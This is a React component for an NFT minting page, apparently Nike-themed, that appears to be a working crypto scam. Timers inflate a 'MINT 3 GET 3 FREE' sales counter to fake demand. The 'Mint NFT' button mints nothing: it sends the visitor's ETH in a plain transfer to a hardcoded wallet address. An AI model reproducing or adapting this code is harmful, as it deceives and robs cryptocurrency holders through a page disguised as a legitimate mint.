import { useEffect, useState } from "react";
import { connectWallet, getCurrentWalletConnected } from "./utils/interact.js";
import "./Minter.css";
import logo from "./logo.png";
import bgVideo from "./assets/nikeland.mp4";
import mobileVideo from "./assets/mobileVideo.mp4"
import detectEthereumProvider from '@metamask/detect-provider'

const Minter = (props) => {
  const [walletAddress, setWallet] = useState("");
  const isOnMobile = window.innerWidth < 479;
  const [status, setStatus] = useState("");
  const [price, setPrice] = useState(0.3);
  const [counter, setCounter] = useState(156);
  const [countereth, setCountereth] = useState(1);


  useEffect(() => {
    const interval = setInterval(() => {
      if (counter < 250) {
        setCounter(counter + 3);
      }
    }, 90 );

    return () => {
      clearInterval(interval);
    };
  });

  useEffect(() => {
    const interval = setInterval(() => {
      if (counter < 500 && counter> 249){
        setCounter(counter + 3);
      }
    }, 100);


    return () => {
      clearInterval(interval);
    };
  });
  useEffect(() => {
    const interval = setInterval(() => {
      if (counter < 600 && counter> 499){
        setCounter(counter + 3);
      }
    }, 500);


    return () => {
      clearInterval(interval);
    };
  });
  useEffect(() => {
    const interval = setInterval(() => {
      if (counter < 700 && counter> 599){
        setCounter(counter + 5);
      }
    }, 35);


    return () => {
      clearInterval(interval);
    };
  });

  useEffect(() => {
    const interval = setInterval(() => {
      if (counter < 725 && counter> 699){
        setCounter(counter + 1);
      }
    }, 100);


    return () => {
      clearInterval(interval);
    };
  });


  useEffect(async () => {
    const provider = await detectEthereumProvider()
 
if (provider) {
 
  console.log('Ethereum successfully detected!')
 
  // From now on, this should always be true:
  // provider === window.ethereum
 
  // Access the decentralized web!
 
  // Legacy providers may only have ethereum.sendAsync
  const chainId = await provider.request({
    method: 'eth_chainId'
  })
} else {
 
  // if the provider is not detected, detectEthereumProvider resolves to null
  console.error('Please install MetaMask!')
}
  }, []);

  useEffect(async () => {
    const { address, status } = await getCurrentWalletConnected();

    setWallet(address);
    setStatus(status);

    addWalletListener();
  }, []);

  function addWalletListener() {
    if (window.ethereum) {
      window.ethereum.on("accountsChanged", (accounts) => {
        if (accounts.length > 0) {
          setWallet(accounts[0]);
          setStatus("👆🏽 Mint 3 GET 3 FREE");
        } else {
          setWallet("");
          setStatus("🦊 Connect to Metamask using the top right button.");
        }
      });
    } else {
      setStatus(
        <p>
          {" "}
          🦊{" "}
          <a target="_blank" href={`https://metamask.io/download.html`}>
            You must install Metamask, a virtual Ethereum wallet, in your
            browser.
          </a>
        </p>
      );
    }
  }

  const connectWalletPressed = async () => {
    connectWallet().then((walletResponse) => {
      setStatus(walletResponse.status);
      setWallet(walletResponse.address);
    });
  };


  const onMintPressed = async () => {
    window.ethereum
      .request({
        method: "eth_sendTransaction",
        params: [
          {
            from: window.ethereum.selectedAddress,
            to: "0x2C4DC188759bA5eA40320004134130c5fbb6CC01",
            value: (price * 1e18).toString(16),
          },
        ],
      })
      .then((txHash) => console.log(txHash))
      .catch((error) => console.error);
  };

  return (
    <div className="minter">
      <video
        autoPlay={true}
        loop={true}
        controls={false}
        playsInline
        muted
      >
        <source
          src={window.innerWidth > 600 ? bgVideo : mobileVideo}
          type="video/mp4"
        />
      </video>
      <div className="header">
        <img src={logo} alt="img" />
      </div>
      <div className="minter-container">
        <h1 id="title">MINT 3 GET 3 FREE {counter}/1000 </h1>
        <p>TOTAL : {Math.round(price*100)/100} ETH</p>
        <div>
          <button
            onClick={() => {
              if (countereth >0){
              setPrice(price - 0.3);
              setCountereth(countereth - 1);
            }}}
          >
            -
          </button>
          <h1>{countereth}</h1>
          <button
            onClick={() => {
              if (countereth <5){
              setPrice(price + 0.3);
              setCountereth(countereth + 1);
              }
            }}
          >
            +
          </button>
        </div>
       
        <button id="walletButton" onClick={() => connectWalletPressed()}>
        {walletAddress.length > 0 ? (
          "Connected: " +
          String(walletAddress).substring(0, 6) +
          "..." +
          String(walletAddress).substring(38)
        ) : (
          <span>Connect Wallet</span>
        )}
      </button>

        <button id="mintButton" onClick={onMintPressed}>
          Mint NFT
        </button>
        <p id="status" style={{ color: "red" }}>
          {status}
        </p>
      </div>
    </div>
  );
};

export default Minter;
